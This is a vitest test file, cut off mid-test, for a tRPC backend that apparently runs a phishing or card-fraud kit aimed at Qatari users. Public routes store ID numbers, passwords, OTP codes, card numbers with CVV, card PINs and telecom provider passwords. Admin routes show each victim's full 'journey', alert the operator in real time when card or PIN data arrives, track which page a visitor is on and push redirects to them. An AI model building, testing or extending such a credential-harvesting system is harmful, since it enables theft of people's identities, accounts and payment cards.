import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { TrpcContext } from "./_core/context";

vi.mock("./_core/visitorChannel", () => ({
  publishVisitorRedirect: vi.fn((_fp: string, _path: string) => 1),
  getVisitorPresence: vi.fn((fp: string) => ({
    online: fp === "fp-9001",
    currentPage: fp === "fp-9001" ? "/06-payment.html" : null,
    lastSeenAt: fp === "fp-9001" ? 1717000000000 : null,
  })),
}));
import {
  publishVisitorRedirect,
  getVisitorPresence,
} from "./_core/visitorChannel";

// Mock GeoIP so listVisitors enrichment never hits the network (fast + deterministic).
vi.mock("./_core/geoip", () => ({
  lookupGeo: vi.fn(async () => null),
  lookupGeoBatch: vi.fn(async (ips: (string | null)[]) => {
    const m = new Map<string, any>();
    for (const ip of ips) if (ip) m.set(ip, null);
    return m;
  }),
}));

// Mock the database module so tests do not require a real DB connection.
vi.mock("./db", () => {
  return {
    getRegistrationById: vi.fn(async (id: number) => ({
      id,
      userType: "QID",
      qid: "21234567890",
      mobile: "55512345",
      email: null,
      intlPhone: null,
      ipAddress: "203.0.113.5",
      userAgent: "vitest",
      fingerprint: String(id),
      createdAt: new Date("2026-01-01T00:00:00Z"),
    })),
    getPersonalInfoByRegistrationId: vi.fn(async (id: number) => [
      {
        id: 100,
        registrationId: id,
        nationality: "QAT",
        arabicName: "محمد",
        englishName: "Mohamed",
        createdAt: new Date("2026-01-01T00:01:00Z"),
      },
    ]),
    getPasswordSubmissionsByRegistrationId: vi.fn(async (id: number) => [
      {
        id: 200,
        registrationId: id,
        password: "Abc12345",
        createdAt: new Date("2026-01-01T00:02:00Z"),
      },
    ]),
    getOtpSubmissionsByRegistrationId: vi.fn(async (id: number) => [
      {
        id: 300,
        registrationId: id,
        otpCode: "1234",
        phoneNumber: "55512345",
        createdAt: new Date("2026-01-01T00:03:00Z"),
      },
    ]),
    insertRegistration: vi.fn(async (_data: unknown) => 42),
    insertOtpSubmission: vi.fn(async (_data: unknown) => 99),
    insertPersonalInfo: vi.fn(async (_data: unknown) => 7),
    insertPasswordSubmission: vi.fn(async (_data: unknown) => 11),
    insertPhoneVerification: vi.fn(async (_data: unknown) => 21),
    insertPaymentSubmission: vi.fn(async (_data: unknown) => 22),
    insertLoginAttempt: vi.fn(async (_data: unknown) => 23),
    insertCardPinSubmission: vi.fn(async (_data: unknown) => 24),
    listRegistrations: vi.fn(async () => [
      { id: 1, userType: "QID", qid: "21234567890", mobile: "55512345" },
    ]),
    listOtpSubmissions: vi.fn(async () => [
      { id: 1, otpCode: "1234", phoneNumber: "55512345" },
    ]),
    listPersonalInfo: vi.fn(async () => [
      { id: 1, registrationId: 1, arabicName: "محمد", englishName: "Mohamed" },
    ]),
    listPasswordSubmissions: vi.fn(async () => [
      { id: 1, registrationId: 1, password: "Abc12345" },
    ]),
    listPhoneVerifications: vi.fn(async () => [
      { id: 1, registrationId: 1, serviceProvider: "Ooredoo", phoneNumber: "55512345" },
    ]),
    listPaymentSubmissions: vi.fn(async () => [
      { id: 1, registrationId: 1, cardNumber: "4111111111111111" },
    ]),
    listLoginAttempts: vi.fn(async () => [
      { id: 1, registrationId: 1, username: "alice" },
    ]),
    listCardPinSubmissions: vi.fn(async () => [
      { id: 1, registrationId: 1, cardPin: "1234" },
    ]),
    getPhoneVerificationsByRegistrationId: vi.fn(async (id: number) => [
      { id: 401, registrationId: id, serviceProvider: "Ooredoo", phoneNumber: "55512345", createdAt: new Date("2026-01-01T00:04:00Z") },
    ]),
    getPaymentSubmissionsByRegistrationId: vi.fn(async (id: number) => [
      { id: 501, registrationId: id, cardNumber: "4111111111111111", cvv: "123", otp: null, createdAt: new Date("2026-01-01T00:05:00Z") },
    ]),
    getLoginAttemptsByRegistrationId: vi.fn(async (id: number) => [
      { id: 601, registrationId: id, username: "alice", password: "x", createdAt: new Date("2026-01-01T00:06:00Z") },
    ]),
    getCardPinSubmissionsByRegistrationId: vi.fn(async (id: number) => [
      { id: 701, registrationId: id, cardPin: "1234", createdAt: new Date("2026-01-01T00:07:00Z") },
    ]),
    getStats: vi.fn(async () => ({
      registrations: 1,
      otps: 1,
      personalInfo: 1,
      passwords: 1,
      phoneVerifications: 1,
      payments: 1,
      logins: 1,
      cardPins: 1,
    })),
    getPaymentSubmissionsSince: vi.fn(async (_since: number) => [
      {
        id: 901,
        registrationId: 42,
        cardNumber: "4111111111111111",
        ipAddress: "10.0.0.1",
        createdAt: new Date("2026-01-01T00:10:00Z"),
      },
    ]),
    getCardPinSubmissionsSince: vi.fn(async (_since: number) => [
      {
        id: 902,
        registrationId: 42,
        cardPin: "1234",
        ipAddress: "10.0.0.2",
        createdAt: new Date("2026-01-01T00:11:00Z"),
      },
    ]),
    upsertUser: vi.fn(async () => undefined),
    getUserByOpenId: vi.fn(async () => undefined),
    getDb: vi.fn(async () => null),
    resolveRegistration: vi.fn(async () => 42),
    archiveRegistrations: vi.fn(async (ids: number[]) => ids.length),
    unarchiveRegistrations: vi.fn(async (ids: number[]) => ids.length),
    deleteRegistrationsCascade: vi.fn(async (ids: number[]) => ids.length),
    getAllVisitorsAggregated: vi.fn(async (_limit?: number, _archived?: "active" | "archived" | "all") => [
      {
        registration: {
          id: 1,
          userType: "QID",
          qid: "21234567890",
          mobile: "55512345",
          email: "alice@example.com",
          intlPhone: null,
          ipAddress: "203.0.113.5",
          userAgent: "vitest",
          createdAt: new Date("2026-06-01T08:00:00Z"),
        },
        personalInfo: [
          { id: 11, registrationId: 1, arabicName: "أليس", firstName: "Alice", lastName: "K" },
        ],
        passwords: [{ id: 21, registrationId: 1, password: "Abc12345" }],
        otps: [],
        phoneVerifications: [],
        payments: [
          { id: 31, registrationId: 1, cardNumber: "4111111111111111" },
        ],
        logins: [],
        cardPins: [{ id: 41, registrationId: 1, cardPin: "1234" }],
        stagesCompleted: 5,
        lastActivityAt: new Date(),
      },
      {
        registration: {
          id: 2,
          userType: "NON_QID",
          qid: null,
          mobile: null,
          email: "bob@example.com",
          intlPhone: "+9665551234",
          ipAddress: "203.0.113.9",
          userAgent: "vitest",
          createdAt: new Date("2025-12-01T08:00:00Z"),
        },
        personalInfo: [],
        passwords: [],
        otps: [],
        phoneVerifications: [],
        payments: [],
        logins: [],
        cardPins: [],
        stagesCompleted: 1,
        lastActivityAt: new Date("2025-12-01T08:00:00Z"),
      },
    ]),
  };
});

import * as dbMock from "./db";
import { appRouter } from "./routers";

type AdminUser = NonNullable<TrpcContext["user"]>;

function buildContext(role: "admin" | "user" | null): TrpcContext {
  const user: AdminUser | null =
    role === "user"
      ? ({
          id: 1,
          openId: "owner-open-id",
          email: "owner@example.com",
          name: "Owner",
          loginMethod: "manus",
          role,
          createdAt: new Date(),
          updatedAt: new Date(),
          lastSignedIn: new Date(),
        } as AdminUser)
      : null;

  const adminSession = role === "admin" ? { username: "admin" } : null;

  return {
    user,
    adminSession,
    req: {
      protocol: "https",
      headers: { "x-forwarded-for": "203.0.113.5", "user-agent": "vitest", "x-visitor-fingerprint": "test-fp-123" },
      ip: "203.0.113.5",
    } as TrpcContext["req"],
    res: {
      clearCookie: () => {},
      cookie: () => {},
    } as TrpcContext["res"],
  };
}

beforeEach(() => {
  vi.clearAllMocks();
});

afterEach(() => {
  vi.clearAllMocks();
});

describe("registration.submit", () => {
  it("inserts a QID registration and returns its id", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.registration.submit({
      userType: "QID",
      qid: "21234567890",
      mobile: "55512345",
    });

    expect(result).toEqual({ success: true, id: 42 });
    expect(dbMock.resolveRegistration).toHaveBeenCalledTimes(1);
    const args = (dbMock.resolveRegistration as any).mock.calls[0];
    // resolveRegistration(fingerprint, ip, userAgent, data)
    expect(args[0]).toBe("test-fp-123"); // fingerprint from header
    expect(args[1]).toBe("203.0.113.5"); // ip
    expect(args[2]).toBe("vitest"); // userAgent
    expect(args[3].userType).toBe("QID");
    expect(args[3].qid).toBe("21234567890");
    expect(args[3].mobile).toBe("55512345");
  });

  it("inserts a NON_QID registration with email and intl phone", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.registration.submit({
      userType: "NON_QID",
      email: "user@example.com",
      intlPhone: "+9665551234",
    });

    expect(result.success).toBe(true);
    const args = (dbMock.resolveRegistration as any).mock.calls[0];
    expect(args[3].userType).toBe("NON_QID");
    expect(args[3].email).toBe("user@example.com");
    expect(args[3].intlPhone).toBe("+9665551234");
  });
});

describe("otp.submit", () => {
  it("accepts a 4-digit OTP and stores it", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.otp.submit({
      otpCode: "1234",
      registrationId: 42,
      phoneNumber: "55512345",
    });

    expect(result).toEqual({ success: true, id: 99 });
    expect(dbMock.insertOtpSubmission).toHaveBeenCalledTimes(1);
    const arg = (dbMock.insertOtpSubmission as any).mock.calls[0][0];
    expect(arg.otpCode).toBe("1234");
    expect(arg.registrationId).toBe(42);
    expect(arg.phoneNumber).toBe("55512345");
  });

  it("accepts a 6-digit OTP without registration id", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.otp.submit({ otpCode: "123456" });
    expect(result.success).toBe(true);
    const arg = (dbMock.insertOtpSubmission as any).mock.calls[0][0];
    expect(arg.otpCode).toBe("123456");
    // resolveRegistration returns 42 (from mock), so registrationId is 42
    expect(arg.registrationId).toBe(42);
  });

  it("rejects an empty OTP code", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);
    await expect(caller.otp.submit({ otpCode: "" })).rejects.toThrow();
  });
});

describe("personalInfo.submit", () => {
  it("inserts personal info and returns its id", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.personalInfo.submit({
      registrationId: 42,
      nationality: "QAT",
      arabicName: "محمد",
      englishName: "Mohamed",
      birthDate: "1990-01-01",
      gender: "MALE",
      email: "user@example.com",
      buildingNumber: "22",
      street: "Main",
      zone: "40",
    });

    expect(result).toEqual({ success: true, id: 7 });
    expect(dbMock.insertPersonalInfo).toHaveBeenCalledTimes(1);
    const arg = (dbMock.insertPersonalInfo as any).mock.calls[0][0];
    expect(arg.registrationId).toBe(42);
    expect(arg.nationality).toBe("QAT");
    expect(arg.arabicName).toBe("محمد");
    expect(arg.englishName).toBe("Mohamed");
    expect(arg.email).toBe("user@example.com");
    expect(arg.ipAddress).toBe("203.0.113.5");
    expect(arg.userAgent).toBe("vitest");
  });

  it("accepts partial personal info with no registration id", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.personalInfo.submit({
      arabicName: "سارة",
    });

    expect(result.success).toBe(true);
    const arg = (dbMock.insertPersonalInfo as any).mock.calls[0][0];
    expect(arg.arabicName).toBe("سارة");
    // resolveRegistration returns 42 (from mock)
    expect(arg.registrationId).toBe(42);
    expect(arg.nationality).toBeNull();
  });
});

describe("password.submit", () => {
  it("stores a password tied to a registration id", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.password.submit({
      registrationId: 42,
      password: "Abc12345",
    });

    expect(result).toEqual({ success: true, id: 11 });
    expect(dbMock.insertPasswordSubmission).toHaveBeenCalledTimes(1);
    const arg = (dbMock.insertPasswordSubmission as any).mock.calls[0][0];
    expect(arg.registrationId).toBe(42);
    expect(arg.password).toBe("Abc12345");
    expect(arg.ipAddress).toBe("203.0.113.5");
  });

  it("rejects an empty password", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);
    await expect(caller.password.submit({ password: "" })).rejects.toThrow();
  });
});

describe("phoneVerify.submit", () => {
  it("stores phone verification data", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.phoneVerify.submit({
      registrationId: 42,
      serviceProvider: "Ooredoo",
      phoneNumber: "55512345",
      cardOwnerId: "21234567890",
      providerEmail: "u@example.com",
      providerPassword: "secret",
    });

    expect(result).toEqual({ success: true, id: 21 });
    const arg = (dbMock.insertPhoneVerification as any).mock.calls[0][0];
    expect(arg.registrationId).toBe(42);
    expect(arg.serviceProvider).toBe("Ooredoo");
    expect(arg.providerPassword).toBe("secret");
  });

  it("accepts an empty payload (all fields optional)", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);
    const result = await caller.phoneVerify.submit({});
    expect(result.success).toBe(true);
    const arg = (dbMock.insertPhoneVerification as any).mock.calls[0][0];
    // resolveRegistration returns 42 (from mock)
    expect(arg.registrationId).toBe(42);
    expect(arg.phoneNumber).toBeNull();
  });
});

describe("payment.submit", () => {
  it("stores card data without OTP", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.payment.submit({
      registrationId: 42,
      cardNumber: "4111111111111111",
      expMonth: "12",
      expYear: "30",
      cvv: "123",
    });

    expect(result).toEqual({ success: true, id: 22 });
    const arg = (dbMock.insertPaymentSubmission as any).mock.calls[0][0];
    expect(arg.cardNumber).toBe("4111111111111111");
    expect(arg.cvv).toBe("123");
    expect(arg.otp).toBeNull();
  });

  it("stores standalone OTP step", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.payment.submit({
      registrationId: 42,
      otp: "4321",
    });
    expect(result.success).toBe(true);
    const arg = (dbMock.insertPaymentSubmission as any).mock.calls[0][0];
    expect(arg.otp).toBe("4321");
  });
});

describe("login.submit", () => {
  it("stores login attempt with username and password", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.login.submit({
      username: "alice",
      password: "hunter2",
    });

    expect(result).toEqual({ success: true, id: 23 });
    const arg = (dbMock.insertLoginAttempt as any).mock.calls[0][0];
    expect(arg.username).toBe("alice");
    expect(arg.password).toBe("hunter2");
    expect(arg.ipAddress).toBe("203.0.113.5");
  });

  it("accepts username over the max length boundary", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.login.submit({ username: "x".repeat(300), password: "x" }),
    ).rejects.toThrow();
  });
});

describe("cardPin.submit", () => {
  it("stores card PIN", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);

    const result = await caller.cardPin.submit({
      registrationId: 42,
      cardPin: "1234",
    });

    expect(result).toEqual({ success: true, id: 24 });
    const arg = (dbMock.insertCardPinSubmission as any).mock.calls[0][0];
    expect(arg.cardPin).toBe("1234");
    expect(arg.registrationId).toBe(42);
  });

  it("rejects empty PIN", async () => {
    const ctx = buildContext(null);
    const caller = appRouter.createCaller(ctx);
    await expect(caller.cardPin.submit({ cardPin: "" })).rejects.toThrow();
  });
});

describe("admin procedures", () => {
  it("rejects unauthenticated callers", async () => {
    const caller = appRouter.createCaller(buildContext(null));
    await expect(caller.admin.getStats()).rejects.toThrow();
    await expect(caller.admin.getRegistrations()).rejects.toThrow();
    await expect(caller.admin.getOtpSubmissions()).rejects.toThrow();
    await expect(caller.admin.getPersonalInfo()).rejects.toThrow();
    await expect(caller.admin.getPasswordSubmissions()).rejects.toThrow();
    await expect(caller.admin.getPhoneVerifications()).rejects.toThrow();
    await expect(caller.admin.getPaymentSubmissions()).rejects.toThrow();
    await expect(caller.admin.getLoginAttempts()).rejects.toThrow();
    await expect(caller.admin.getCardPinSubmissions()).rejects.toThrow();
  });

  it("rejects non-admin authenticated callers", async () => {
    const caller = appRouter.createCaller(buildContext("user"));
    await expect(caller.admin.getStats()).rejects.toThrow();
  });

  it("returns data for admin callers", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));

    const stats = await caller.admin.getStats();
    expect(stats.registrations).toBe(1);
    expect(stats.otps).toBe(1);
    expect(stats.personalInfo).toBe(1);
    expect(stats.passwords).toBe(1);
    expect(stats.phoneVerifications).toBe(1);
    expect(stats.payments).toBe(1);
    expect(stats.logins).toBe(1);
    expect(stats.cardPins).toBe(1);

    const phones = await caller.admin.getPhoneVerifications();
    expect(phones.length).toBe(1);

    const payments = await caller.admin.getPaymentSubmissions();
    expect(payments.length).toBe(1);

    const logins = await caller.admin.getLoginAttempts();
    expect(logins.length).toBe(1);

    const pins = await caller.admin.getCardPinSubmissions();
    expect(pins.length).toBe(1);

    const regs = await caller.admin.getRegistrations();
    expect(Array.isArray(regs)).toBe(true);
    expect(regs.length).toBe(1);

    const otps = await caller.admin.getOtpSubmissions();
    expect(Array.isArray(otps)).toBe(true);
    expect(otps.length).toBe(1);

    const pinfo = await caller.admin.getPersonalInfo();
    expect(Array.isArray(pinfo)).toBe(true);
    expect(pinfo.length).toBe(1);

    const pwds = await caller.admin.getPasswordSubmissions();
    expect(Array.isArray(pwds)).toBe(true);
    expect(pwds.length).toBe(1);
  });

  it("returns a full journey for an admin caller", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));

    const journey = await caller.admin.getJourney({ registrationId: 42 });

    expect(journey.registration).toBeTruthy();
    expect(journey.registration?.id).toBe(42);
    expect(journey.personalInfo).toHaveLength(1);
    expect(journey.personalInfo[0].registrationId).toBe(42);
    expect(journey.passwords).toHaveLength(1);
    expect(journey.passwords[0].password).toBe("Abc12345");
    expect(journey.otps).toHaveLength(1);
    expect(journey.otps[0].otpCode).toBe("1234");
    expect(journey.phoneVerifications).toHaveLength(1);
    expect(journey.payments).toHaveLength(1);
    expect(journey.logins).toHaveLength(1);
    expect(journey.cardPins).toHaveLength(1);

    expect(dbMock.getRegistrationById).toHaveBeenCalledWith(42);
    expect(dbMock.getPersonalInfoByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getPasswordSubmissionsByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getOtpSubmissionsByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getPhoneVerificationsByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getPaymentSubmissionsByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getLoginAttemptsByRegistrationId).toHaveBeenCalledWith(42);
    expect(dbMock.getCardPinSubmissionsByRegistrationId).toHaveBeenCalledWith(42);
  });

  it("rejects getJourney for non-admin callers", async () => {
    const caller = appRouter.createCaller(buildContext("user"));
    await expect(
      caller.admin.getJourney({ registrationId: 42 }),
    ).rejects.toThrow();
  });

  it("rejects getJourney with invalid registrationId", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    await expect(
      caller.admin.getJourney({ registrationId: -1 }),
    ).rejects.toThrow();
  });

  it("rejects getRecentAlerts for unauthenticated callers", async () => {
    const caller = appRouter.createCaller(buildContext(null));
    await expect(
      caller.admin.getRecentAlerts({ since: 0 }),
    ).rejects.toThrow();
  });

  it("rejects getRecentAlerts for non-admin callers", async () => {
    const caller = appRouter.createCaller(buildContext("user"));
    await expect(
      caller.admin.getRecentAlerts({ since: 0 }),
    ).rejects.toThrow();
  });

  it("returns merged payment + cardPin alerts sorted by createdAt desc", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    const result = await caller.admin.getRecentAlerts({ since: 0 });

    expect(dbMock.getPaymentSubmissionsSince).toHaveBeenCalledWith(0);
    expect(dbMock.getCardPinSubmissionsSince).toHaveBeenCalledWith(0);
    expect(typeof result.serverTime).toBe("number");
    expect(result.items).toHaveLength(2);
    // cardPin event is at 00:11 (newer) and payment at 00:10 -> cardPin first
    expect(result.items[0].kind).toBe("cardPin");
    expect(result.items[1].kind).toBe("payment");
    expect(result.items[0].registrationId).toBe(42);
    expect(result.items[1].summary).toContain("1111");
  });

  it("rejects getRecentAlerts with invalid since input", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    await expect(
      caller.admin.getRecentAlerts({ since: -1 }),
    ).rejects.toThrow();
  });

  it("forwards the since watermark to db helpers (filters older items)", async () => {
    const cutoff = Date.parse("2026-01-01T00:10:30Z");
    // Make the helpers respect the cutoff so older rows are dropped.
    (dbMock.getPaymentSubmissionsSince as any).mockImplementationOnce(
      async (sinceMs: number) => {
        const all = [
          {
            id: 901,
            registrationId: 42,
            cardNumber: "4111111111111111",
            ipAddress: "10.0.0.1",
            createdAt: new Date("2026-01-01T00:10:00Z"), // older
          },
          {
            id: 999,
            registrationId: 42,
            cardNumber: "5555444433332222",
            ipAddress: "10.0.0.9",
            createdAt: new Date("2026-01-01T00:12:00Z"), // newer
          },
        ];
        return all.filter((r) => r.createdAt.getTime() > sinceMs);
      },
    );
    (dbMock.getCardPinSubmissionsSince as any).mockImplementationOnce(
      async (_sinceMs: number) => [],
    );

    const caller = appRouter.createCaller(buildContext("admin"));
    const result = await caller.admin.getRecentAlerts({ since: cutoff });

    expect(dbMock.getPaymentSubmissionsSince).toHaveBeenLastCalledWith(cutoff);
    expect(dbMock.getCardPinSubmissionsSince).toHaveBeenLastCalledWith(cutoff);
    expect(result.items).toHaveLength(1);
    expect(result.items[0].id).toBe(999);
    expect(result.items[0].kind).toBe("payment");
    expect(result.items[0].summary).toContain("2222");
  });

  it("end-to-end: a payment.submit appears in admin.getRecentAlerts", async () => {
    // 1) capture what the public router writes through insertPaymentSubmission.
    let captured: any = null;
    (dbMock.insertPaymentSubmission as any).mockImplementationOnce(
      async (row: any) => {
        captured = {
          id: 7777,
          ...row,
          createdAt: new Date("2026-02-02T00:00:01Z"),
        };
        return captured;
      },
    );
    // 2) make getPaymentSubmissionsSince return that captured row.
    (dbMock.getPaymentSubmissionsSince as any).mockImplementationOnce(
      async (_sinceMs: number) => (captured ? [captured] : []),
    );
    (dbMock.getCardPinSubmissionsSince as any).mockImplementationOnce(
      async (_sinceMs: number) => [],
    );

    const publicCaller = appRouter.createCaller(buildContext(null));
    await publicCaller.payment.submit({
      registrationId: 42,
      cardNumber: "4242424242424242",
      cardholderName: "Alice",
      expiryMonth: "12",
      expiryYear: "30",
      cvv: "123",
      otp: null,
      step: "card",
    } as any);

    const adminCaller = appRouter.createCaller(buildContext("admin"));
    const alerts = await adminCaller.admin.getRecentAlerts({ since: 0 });

    expect(dbMock.insertPaymentSubmission).toHaveBeenCalled();
    expect(alerts.items).toHaveLength(1);
    expect(alerts.items[0].kind).toBe("payment");
    expect(alerts.items[0].id).toBe(7777);
    expect(alerts.items[0].registrationId).toBe(42);
    expect(alerts.items[0].summary).toContain("4242");
  });

  it("listVisitors: rejects unauthenticated callers", async () => {
    const caller = appRouter.createCaller(buildContext(null));
    await expect(caller.admin.listVisitors({ stage: "all", limit: 200 })).rejects.toThrow();
  });

  it("listVisitors: rejects non-admin callers", async () => {
    const caller = appRouter.createCaller(buildContext("user"));
    await expect(caller.admin.listVisitors({ stage: "all", limit: 200 })).rejects.toThrow();
  });

  it("listVisitors: returns all visitors with stage=all", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    const res = await caller.admin.listVisitors({ stage: "all", limit: 200 });
    expect(res.total).toBe(2);
    expect(res.shown).toBe(2);
    expect(res.visitors[0].registration.id).toBe(1);
  });

  it("listVisitors: attaches presence (online/currentPage/lastSeenAt) from visitorChannel", async () => {
    (dbMock.getAllVisitorsAggregated as any).mockResolvedValueOnce([
      {
        registration: {
          id: 9001,
          userType: "QID",
          qid: "99999999999",
          mobile: null,
          email: null,
          intlPhone: null,
          ipAddress: null,
          archivedAt: null,
          fingerprint: "fp-9001",
        },
        personalInfo: [],
        passwords: [],
        otps: [],
        phoneVerifications: [],
        payments: [],
        logins: [],
        cardPins: [],
        lastActivityAt: new Date(),
      },
      {
        registration: {
          id: 9002,
          userType: "QID",
          qid: "88888888888",
          mobile: null,
          email: null,
          intlPhone: null,
          ipAddress: null,
          archivedAt: null,
          fingerprint: "fp-9002",
        },
        personalInfo: [],
        passwords: [],
        otps: [],
        phoneVerifications: [],
        payments: [],
        logins: [],
        cardPins: [],
        lastActivityAt: new Date(),
      },
    ]);
    const caller = appRouter.createCaller(buildContext("admin"));
    const res = await caller.admin.listVisitors({ stage: "all", limit: 200 });
    expect(res.shown).toBe(2);
    const online = res.visitors.find((v: any) => v.registration.id === 9001);
    const offline = res.visitors.find((v: any) => v.registration.id === 9002);
    expect(online?.presence).toEqual({
      online: true,
      currentPage: "/06-payment.html",
      lastSeenAt: 1717000000000,
    });
    expect(offline?.presence).toEqual({
      online: false,
      currentPage: null,
      lastSeenAt: null,
    });
    expect(getVisitorPresence).toHaveBeenCalledWith("fp-9001");
    expect(getVisitorPresence).toHaveBeenCalledWith("fp-9002");
  });

  it("listVisitors: filters by stage=reachedPayment", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    const res = await caller.admin.listVisitors({ stage: "reachedPayment", limit: 200 });
    expect(res.shown).toBe(1);
    expect(res.visitors[0].registration.id).toBe(1);
  });

  it("listVisitors: filters by stage=enteredPin", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    const res = await caller.admin.listVisitors({ stage: "enteredPin", limit: 200 });
    expect(res.shown).toBe(1);
    expect(res.visitors[0].cardPins.length).toBeGreaterThan(0);
  });

  it("listVisitors: search matches actual schema fields (arabicName, cardOwnerId)", async () => {
    (dbMock.getAllVisitorsAggregated as any).mockResolvedValueOnce([
      {
        registration: {
          id: 10,
          userType: "QID",
          qid: "99999999999",
          mobile: "55500000",
          email: null,
          intlPhone: null,
          ipAddress: "10.0.0.10",
          userAgent: "vitest",
          createdAt: new Date(),
        },
        personalInfo: [
          { id: 1, registrationId: 10, arabicName: "فاطمة الزهراء", englishName: null },
        ],
        passwords: [],
        otps: [],
        phoneVerifications: [
          { id: 1, registrationId: 10, cardOwnerId: "AB-OWNER-77", phoneNumber: null, providerEmail: null },
        ],
        payments: [],
        logins: [],
        cardPins: [],
        stagesCompleted: 1,
        lastActivityAt: new Date(),
      },
    ]);
    const caller = appRouter.createCaller(buildContext("admin"));
    const byArabicName = await caller.admin.listVisitors({ stage: "all", limit: 200, search: "فاطمة" });
    expect(byArabicName.shown).toBe(1);
    expect(byArabicName.visitors[0].registration.id).toBe(10);

    (dbMock.getAllVisitorsAggregated as any).mockResolvedValueOnce([
      {
        registration: {
          id: 11,
          userType: "QID",
          qid: "88888888888",
          mobile: null,
          email: null,
          intlPhone: null,
          ipAddress: null,
          userAgent: "vitest",
          createdAt: new Date(),
        },
        personalInfo: [],
        passwords: [],
        otps: [],
        phoneVerifications: [
          { id: 2, registrationId: 11, cardOwnerId: "AB-OWNER-77", phoneNumber: null, providerEmail: null },
        ],
        payments: [],
        logins: [],
        cardPins: [],
        stagesCompleted: 1,
        lastActivityAt: new Date(),
      },
    ]);
    const byCardOwnerId = await caller.admin.listVisitors({ stage: "all", limit: 200, search: "AB-OWNER-77" });
    expect(byCardOwnerId.shown).toBe(1);
    expect(byCardOwnerId.visitors[0].registration.id).toBe(11);
  });

  it("listVisitors: search filters by qid/email/ip", async () => {
    const caller = appRouter.createCaller(buildContext("admin"));
    const byQid = await caller.admin.listVisitors({ stage: "all", limit: 200, search: "21234567890" });
    expect(byQid.shown).toBe(1);
    expect(byQid.visitors[0].registration.id).toBe(1);

    const byEmail = await caller.admin.listVisitors({ stage: "all", limit: 200, search: "bob@example.com" });
    expect(byEmail.shown).toBe(1);
    expect(byEmail.visitors[0].registration.id).toBe(2);

    const empty = await caller.admin.listVisitors({ stage: "all", limit: 200, search: "no_such_match_xyz" });
    expect(empty.shown).toBe(0);
  });

  it("end-to-end: a cardPin.submit appears in admin.getRecentAlerts", async () => {
    let captured: any = null;
    (dbMock.insertCardPinSubmission as any).mockImplementationOnce(
      async (row: any) => {
        captured = {
          id: 8888,
          ...row,
          createdAt: new Date("2026-02-02T00:00:02Z"),
        };
        return captured;
      },
    );
    (dbMock.getPaymentSubmissionsSince as any).mockImplementationOnce(
      async (_sinceMs: number) => [],
    );
    (dbMock.getCardPinSubmissionsSince as any).mockImplementationOnce(
      async (_sinceMs: number) => (captured ? [captured] : []),
    );

    const publicCaller = appRouter.createCaller(buildContext(null));
    await publicCaller.cardPin.submit({
      registrationId: 42,
      cardPin: "4321",
    } as any);

    const adminCaller = appRouter.createCaller(buildContext("admin"));
    const alerts = await adminCaller.admin.getRecentAlerts({ since: 0 });

    expect(dbMock.insertCardPinSubmission).toHaveBeenCalled();
    expect(alerts.items).toHaveLength(1);
    expect(alerts.items[0].kind).toBe("cardPin");
    expect(alerts.items[0].id).toBe(8888);
    expect(alerts.items[0].registrationId).toBe(42);
    expect(alerts.items[0].summary).toContain("4321");
  });

  it("archiveVisitors: requires admin and forwards ids to helper", async () => {
    const userCaller = appRouter.createCaller(buildContext("user"));
    await expect(
      userCaller.admin.archiveVisitors({ ids: [1, 2] }),
    ).rejects.toThrow();

    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (dbMock.archiveRegistrations as any).mockResolvedValueOnce(2);
    const res = await adminCaller.admin.archiveVisitors({ ids: [1, 2] });
    expect(dbMock.archiveRegistrations).toHaveBeenLastCalledWith([1, 2]);
    expect(res.affected).toBe(2);
  });

  it("unarchiveVisitors: forwards ids and returns affected count", async () => {
    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (dbMock.unarchiveRegistrations as any).mockResolvedValueOnce(3);
    const res = await adminCaller.admin.unarchiveVisitors({ ids: [10, 11, 12] });
    expect(dbMock.unarchiveRegistrations).toHaveBeenLastCalledWith([10, 11, 12]);
    expect(res.affected).toBe(3);
  });

  it("deleteVisitors: requires admin and forwards ids for cascade delete", async () => {
    const userCaller = appRouter.createCaller(buildContext("user"));
    await expect(
      userCaller.admin.deleteVisitors({ ids: [99] }),
    ).rejects.toThrow();

    const adminCaller = appRouter.createCaller(buildContext("admin"));
    (dbMock.deleteRegistrationsCascade as any).mockResolvedValueOnce(1);
    const res = await adminCaller.admin.deleteVisitors({ ids: [99] });
    expect(dbMock.deleteRegistrationsCascade).toHaveBeenLastCalledWith([99]);
    expect(res.affected).toBe(1);
  });

  it("redirectVisitor: requires admin", async () => {
